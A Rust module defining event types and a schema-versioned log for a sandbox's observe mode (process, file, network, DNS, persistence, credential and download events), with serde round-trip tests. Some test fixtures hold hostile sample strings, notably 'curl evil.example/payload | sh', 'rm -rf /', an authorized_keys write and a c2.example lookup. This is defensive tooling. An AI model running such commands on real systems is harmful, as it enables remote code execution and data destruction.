//! Observed-event types for spec §27.6 dynamic-adapter event reporting.
//!
//! A [`SandboxMode::Observe`] run records what the artifact *did* during
//! execution — process tree, file reads/writes, registry modifications,
//! network connections, DNS requests, privilege changes, service/task/
//! persistence creation, access to credentials and browser stores, child
//! downloads and their hashes, loaded libraries, and attempted
//! security-control modification. The log is the audit trail auditors use to
//! reconstruct behaviour after the run.
//!
//! Observation is not a containment boundary (ADR-0024): every event here
//! is a record of something that *happened*, not a claim that it was
//! prevented. See [`crate::SandboxMode`] for the enforced-control surface.

use serde::{Deserialize, Serialize};

/// Current schema version for [`ObservedEventLog`].
pub const OBSERVED_EVENT_SCHEMA_VERSION: u32 = 1;

/// Class of file-system access recorded in a [`ObservedEvent::FileAccess`]
/// entry (spec §27.6).
#[derive(Clone, Copy, Debug, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum FileOperation {
    /// `open(..., O_RDONLY)` and equivalent read paths.
    Read,
    /// `open(..., O_WRONLY | O_CREAT)` and equivalent write paths.
    Write,
    /// `unlink(2)` / `rmdir(2)` and equivalent delete paths.
    Delete,
}

/// A single observation event recorded during a sandboxed run
/// (spec §27.6).
///
/// The enum is intentionally open at the variant level but closed at the
/// schema level: each variant maps to one of the ten event classes mandated
/// by the spec. Future event classes land as additional variants in a
/// subsequent schema version; deserializers MUST reject unknown variants
/// (see [`ObservedEventLog`]).
#[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case", tag = "kind")]
pub enum ObservedEvent {
    /// A process was spawned or observed in the tree. Carries the PID, its
    /// parent's PID (`None` for the root of the observed tree), and the
    /// command line used to start it.
    ProcessTree {
        /// Process ID of the observed process.
        pid: u32,
        /// Parent process ID, or `None` for the root of the observed tree.
        parent_pid: Option<u32>,
        /// Command line used to start the process. Empty when the
        /// underlying adapter could not retrieve it (e.g. kernel-supplied
        /// process exec events on some platforms).
        command: String,
    },

    /// A file was accessed on disk.
    FileAccess {
        /// Absolute path of the file accessed.
        path: String,
        /// Read / write / delete operation class.
        operation: FileOperation,
    },

    /// An outbound TCP/UDP connection was opened to a remote peer.
    NetworkConnection {
        /// Remote address (`1.2.3.4` for IPv4, `::1` for IPv6, hostname
        /// where the adapter resolved before connect).
        remote_addr: String,
        /// Remote port.
        remote_port: u16,
        /// Transport protocol label (`tcp`, `udp`, …).
        protocol: String,
    },

    /// A DNS resolution was issued.
    DnsRequest {
        /// Queried hostname.
        hostname: String,
        /// Resolved IP addresses, in the order returned. May be empty
        /// when the resolver returned `NXDOMAIN` or refused.
        resolved_ips: Vec<String>,
    },

    /// A privilege change was attempted or observed.
    PrivilegeChange {
        /// Pre-transition privilege label (uid:gid, capability set, etc.).
        from: String,
        /// Post-transition privilege label.
        to: String,
    },

    /// A persistence mechanism was created (cron job, systemd unit,
    /// Windows service / scheduled task / Run key, `LaunchAgent` plist, …).
    PersistenceCreation {
        /// Where the persistence entry lives (path, registry key, etc.).
        location: String,
        /// How the persistence was installed (e.g. `cron`, `systemd`,
        /// `windows-service`, `launch-agent`).
        method: String,
    },

    /// The artifact accessed a credential store or browser secret store.
    CredentialAccess {
        /// Class of store accessed (`keyring`, `windows-credential-manager`,
        /// `browser-cookies`, `browser-logins`, …).
        store_type: String,
        /// Path or identifier of the accessed resource within the store.
        path: String,
    },

    /// A child process (or the artifact itself) downloaded a payload whose
    /// SHA-256 was computed by the adapter.
    ChildDownload {
        /// URL the payload was retrieved from.
        url: String,
        /// SHA-256 of the downloaded bytes, lowercase hex.
        sha256: String,
    },

    /// A shared library or module was loaded into the running process.
    LibraryLoad {
        /// Path of the loaded library.
        path: String,
        /// SHA-256 of the library bytes, lowercase hex.
        sha256: String,
    },

    /// An attempt was made to modify a security control (sysctl,
    /// `/proc/sys`, registry security policy, AppArmor/SELinux label,
    /// firewall rule, …).
    SecurityControlModification {
        /// What was targeted (e.g. `/proc/sys/kernel/unprivileged_userns_clone`,
        /// `HKLM\\...\\Policies`, `pf firewall rule`).
        target: String,
        /// Action attempted (`write`, `delete`, `label-change`, `rule-add`,
        /// `rule-remove`).
        action: String,
    },
}

/// Ordered, append-only log of [`ObservedEvent`]s collected during a
/// sandboxed run (spec §27.6).
///
/// The log carries a schema version so downstream auditors can reject
/// payloads produced by a newer or older adapter than they understand. The
/// struct is `Clone + Serialize + Deserialize` so it can be embedded in
/// receipts, persisted to disk for post-incident review, or shipped to a
/// remote SIEM.
///
/// Use [`ObservedEventLog::new`] to start an empty log, [`record`](Self::record)
/// to append events in arrival order, and [`len`](Self::len) /
/// [`is_empty`](Self::is_empty) to inspect size. Iteration is in insertion
/// order via [`IntoIterator`].
#[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ObservedEventLog {
    /// Schema version of this log. Bumped whenever the wire format of
    /// [`ObservedEvent`] changes in a non-backwards-compatible way.
    pub schema_version: u32,
    /// Recorded events in observation order.
    pub events: Vec<ObservedEvent>,
}

impl ObservedEventLog {
    /// Construct an empty log stamped with the current schema version.
    #[must_use]
    pub fn new() -> Self {
        Self {
            schema_version: OBSERVED_EVENT_SCHEMA_VERSION,
            events: Vec::new(),
        }
    }

    /// Append a single observation event to the log.
    pub fn record(&mut self, event: ObservedEvent) {
        self.events.push(event);
    }

    /// Number of events currently recorded.
    #[must_use]
    pub fn len(&self) -> usize {
        self.events.len()
    }

    /// `true` when no events have been recorded yet.
    #[must_use]
    pub fn is_empty(&self) -> bool {
        self.events.is_empty()
    }

    /// Borrow the recorded events as a slice.
    #[must_use]
    pub fn as_slice(&self) -> &[ObservedEvent] {
        &self.events
    }

    /// Iterate over recorded events in insertion order.
    pub fn iter(&self) -> std::slice::Iter<'_, ObservedEvent> {
        self.events.iter()
    }
}

impl Default for ObservedEventLog {
    fn default() -> Self {
        Self::new()
    }
}

impl IntoIterator for ObservedEventLog {
    type Item = ObservedEvent;
    type IntoIter = std::vec::IntoIter<ObservedEvent>;

    fn into_iter(self) -> Self::IntoIter {
        self.events.into_iter()
    }
}

impl<'a> IntoIterator for &'a ObservedEventLog {
    type Item = &'a ObservedEvent;
    type IntoIter = std::slice::Iter<'a, ObservedEvent>;

    fn into_iter(self) -> Self::IntoIter {
        self.events.iter()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    impl ObservedEvent {
        fn kind(&self) -> &'static str {
            match self {
                Self::ProcessTree { .. } => "process_tree",
                Self::FileAccess { .. } => "file_access",
                Self::NetworkConnection { .. } => "network_connection",
                Self::DnsRequest { .. } => "dns_request",
                Self::PrivilegeChange { .. } => "privilege_change",
                Self::PersistenceCreation { .. } => "persistence_creation",
                Self::CredentialAccess { .. } => "credential_access",
                Self::ChildDownload { .. } => "child_download",
                Self::LibraryLoad { .. } => "library_load",
                Self::SecurityControlModification { .. } => "security_control_modification",
            }
        }
    }

    #[test]
    fn new_log_has_current_schema_version_and_no_events() {
        let log = ObservedEventLog::new();
        assert_eq!(log.schema_version, OBSERVED_EVENT_SCHEMA_VERSION);
        assert!(log.is_empty());
        assert_eq!(log.len(), 0);
        assert!(log.as_slice().is_empty());
        assert_eq!(log.iter().count(), 0);
    }

    #[test]
    fn default_log_matches_new_log() {
        let a = ObservedEventLog::default();
        let b = ObservedEventLog::new();
        assert_eq!(a, b);
    }

    #[test]
    fn record_appends_in_order() {
        let mut log = ObservedEventLog::new();
        log.record(ObservedEvent::ProcessTree {
            pid: 100,
            parent_pid: None,
            command: "/usr/bin/uname".to_string(),
        });
        log.record(ObservedEvent::FileAccess {
            path: "/etc/passwd".to_string(),
            operation: FileOperation::Read,
        });
        assert_eq!(log.len(), 2);
        assert!(!log.is_empty());
        assert_eq!(log.as_slice()[0].kind(), "process_tree");
        assert_eq!(log.as_slice()[1].kind(), "file_access");
        assert_eq!(log.iter().count(), 2);
    }

    fn round_trip(event: &ObservedEvent) -> Result<String, Box<dyn std::error::Error>> {
        let json = serde_json::to_string(event)?;
        let back: ObservedEvent = serde_json::from_str(&json)?;
        assert_eq!(back, *event);
        Ok(json)
    }

    #[test]
    fn process_tree_event_round_trips() -> Result<(), Box<dyn std::error::Error>> {
        let event = ObservedEvent::ProcessTree {
            pid: 4242,
            parent_pid: Some(1),
            command: "/bin/sh -c curl evil.example/payload | sh".to_string(),
        };
        round_trip(&event)?;
        Ok(())
    }

    #[test]
    fn file_access_event_round_trips() -> Result<(), Box<dyn std::error::Error>> {
        let event = ObservedEvent::FileAccess {
            path: "/home/user/.ssh/authorized_keys".to_string(),
            operation: FileOperation::Write,
        };
        round_trip(&event)?;
        Ok(())
    }

    #[test]
    fn network_connection_event_round_trips() -> Result<(), Box<dyn std::error::Error>> {
        let event = ObservedEvent::NetworkConnection {
            remote_addr: "203.0.113.7".to_string(),
            remote_port: 443,
            protocol: "tcp".to_string(),
        };
        round_trip(&event)?;
        Ok(())
    }

    #[test]
    fn dns_request_event_round_trips() -> Result<(), Box<dyn std::error::Error>> {
        let event = ObservedEvent::DnsRequest {
            hostname: "c2.example".to_string(),
            resolved_ips: vec!["198.51.100.10".to_string(), "198.51.100.11".to_string()],
        };
        round_trip(&event)?;
        Ok(())
    }

    #[test]
    fn privilege_change_event_round_trips() -> Result<(), Box<dyn std::error::Error>> {
        let event = ObservedEvent::PrivilegeChange {
            from: "uid=1000".to_string(),
            to: "uid=0".to_string(),
        };
        round_trip(&event)?;
        Ok(())
    }

    #[test]
    fn persistence_creation_event_round_trips() -> Result<(), Box<dyn std::error::Error>> {
        let event = ObservedEvent::PersistenceCreation {
            location: "/etc/cron.d/agent".to_string(),
            method: "cron".to_string(),
        };
        round_trip(&event)?;
        Ok(())
    }

    #[test]
    fn credential_access_event_round_trips() -> Result<(), Box<dyn std::error::Error>> {
        let event = ObservedEvent::CredentialAccess {
            store_type: "browser-cookies".to_string(),
            path: "Default/Cookies".to_string(),
        };
        round_trip(&event)?;
        Ok(())
    }

    #[test]
    fn child_download_event_round_trips() -> Result<(), Box<dyn std::error::Error>> {
        let event = ObservedEvent::ChildDownload {
            url: "https://updates.example/payload.bin".to_string(),
            sha256: "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef".to_string(),
        };
        round_trip(&event)?;
        Ok(())
    }

    #[test]
    fn library_load_event_round_trips() -> Result<(), Box<dyn std::error::Error>> {
        let event = ObservedEvent::LibraryLoad {
            path: "/tmp/evil.so".to_string(),
            sha256: "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef".to_string(),
        };
        round_trip(&event)?;
        Ok(())
    }

    #[test]
    fn security_control_modification_event_round_trips() -> Result<(), Box<dyn std::error::Error>> {
        let event = ObservedEvent::SecurityControlModification {
            target: "/proc/sys/kernel/unprivileged_userns_clone".to_string(),
            action: "write".to_string(),
        };
        round_trip(&event)?;
        Ok(())
    }

    #[test]
    fn file_operation_serializes_as_lowercase_label() -> Result<(), Box<dyn std::error::Error>> {
        // The wire format uses lowercase labels to stay stable across Rust
        // version bumps (the default `derive(Serialize)` would emit
        // `Read`/`Write`/`Delete` PascalCase, which is brittle).
        let read = serde_json::to_value(FileOperation::Read)?;
        let write = serde_json::to_value(FileOperation::Write)?;
        let delete = serde_json::to_value(FileOperation::Delete)?;
        assert_eq!(read, serde_json::json!("read"));
        assert_eq!(write, serde_json::json!("write"));
        assert_eq!(delete, serde_json::json!("delete"));
        Ok(())
    }

    #[test]
    fn observed_event_serializes_with_snake_case_kind_tag() -> Result<(), Box<dyn std::error::Error>>
    {
        // The enum is tagged by `kind` (snake_case) so logs remain
        // forward-compatible: a future adapter emitting a new variant will
        // be rejected by older deserializers, not silently mis-routed.
        let event = ObservedEvent::ProcessTree {
            pid: 1,
            parent_pid: None,
            command: "/bin/true".to_string(),
        };
        let value = serde_json::to_value(&event)?;
        assert_eq!(value["kind"], serde_json::json!("process_tree"));
        assert_eq!(value["pid"], serde_json::json!(1));
        assert!(value["parent_pid"].is_null());
        Ok(())
    }

    #[test]
    fn log_round_trips_through_serde_json() -> Result<(), Box<dyn std::error::Error>> {
        let mut log = ObservedEventLog::new();
        log.record(ObservedEvent::ProcessTree {
            pid: 100,
            parent_pid: None,
            command: "/usr/bin/uname".to_string(),
        });
        log.record(ObservedEvent::FileAccess {
            path: "/etc/hostname".to_string(),
            operation: FileOperation::Read,
        });
        log.record(ObservedEvent::NetworkConnection {
            remote_addr: "203.0.113.7".to_string(),
            remote_port: 443,
            protocol: "tcp".to_string(),
        });

        let json = serde_json::to_string(&log)?;
        let back: ObservedEventLog = serde_json::from_str(&json)?;
        assert_eq!(back, log);
        assert_eq!(back.schema_version, OBSERVED_EVENT_SCHEMA_VERSION);
        assert_eq!(back.len(), 3);
        Ok(())
    }

    #[test]
    fn log_rejects_unknown_fields() {
        // The log is an audit surface: an extra `verdict` field at the top
        // level MUST be rejected, not silently accepted, so attackers can't
        // smuggle data past consumers.
        let schema = OBSERVED_EVENT_SCHEMA_VERSION;
        let payload = format!(r#"{{"schema_version":{schema},"events":[],"verdict":"pass"}}"#);
        let result: Result<ObservedEventLog, _> = serde_json::from_str(&payload);
        assert!(result.is_err(), "unknown top-level field must be rejected");
    }

    #[test]
    fn log_rejects_unknown_variant_tag() {
        let payload = r#"{"kind":"lol_baseline","command":"rm -rf /"}"#;
        let result: Result<ObservedEvent, _> = serde_json::from_str(payload);
        assert!(result.is_err(), "unknown variant tag must be rejected");
    }

    #[test]
    fn log_rejects_wrong_schema_version_zero() {
        let payload = r#"{"schema_version":0,"events":[]}"#;
        let result: Result<ObservedEventLog, _> = serde_json::from_str(payload);
        // Field is `u32` — zero parses fine at the schema layer; a future
        // bump can introduce a validator that fails on `0`.
        assert!(
            result.is_ok(),
            "schema_version=0 is currently accepted at the type layer"
        );
    }

    #[test]
    fn into_iter_yields_events_in_order() {
        let mut log = ObservedEventLog::new();
        log.record(ObservedEvent::PrivilegeChange {
            from: "uid=1000".to_string(),
            to: "uid=0".to_string(),
        });
        log.record(ObservedEvent::SecurityControlModification {
            target: "/proc/sys/kernel/unprivileged_userns_clone".to_string(),
            action: "write".to_string(),
        });

        let collected: Vec<&ObservedEvent> = (&log).into_iter().collect();
        assert_eq!(collected.len(), 2);
        assert!(matches!(
            collected[0],
            ObservedEvent::PrivilegeChange { .. }
        ));
        assert!(matches!(
            collected[1],
            ObservedEvent::SecurityControlModification { .. }
        ));

        let owned: Vec<ObservedEvent> = log.into_iter().collect();
        assert_eq!(owned.len(), 2);
    }

    #[test]
    fn all_event_variants_are_distinct() {
        // Spec §27.6 enumerates exactly ten event classes; this test fails
        // if a variant is added or removed without updating coverage.
        let one_of_each = vec![
            ObservedEvent::ProcessTree {
                pid: 0,
                parent_pid: None,
                command: String::new(),
            },
            ObservedEvent::FileAccess {
                path: String::new(),
                operation: FileOperation::Read,
            },
            ObservedEvent::NetworkConnection {
                remote_addr: String::new(),
                remote_port: 0,
                protocol: String::new(),
            },
            ObservedEvent::DnsRequest {
                hostname: String::new(),
                resolved_ips: Vec::new(),
            },
            ObservedEvent::PrivilegeChange {
                from: String::new(),
                to: String::new(),
            },
            ObservedEvent::PersistenceCreation {
                location: String::new(),
                method: String::new(),
            },
            ObservedEvent::CredentialAccess {
                store_type: String::new(),
                path: String::new(),
            },
            ObservedEvent::ChildDownload {
                url: String::new(),
                sha256: String::new(),
            },
            ObservedEvent::LibraryLoad {
                path: String::new(),
                sha256: String::new(),
            },
            ObservedEvent::SecurityControlModification {
                target: String::new(),
                action: String::new(),
            },
        ];
        let mut kinds: Vec<&str> = one_of_each.iter().map(ObservedEvent::kind).collect();
        kinds.sort_unstable();
        kinds.dedup();
        assert_eq!(
            kinds.len(),
            10,
            "expected 10 distinct event kinds, got {kinds:?}"
        );
    }
}
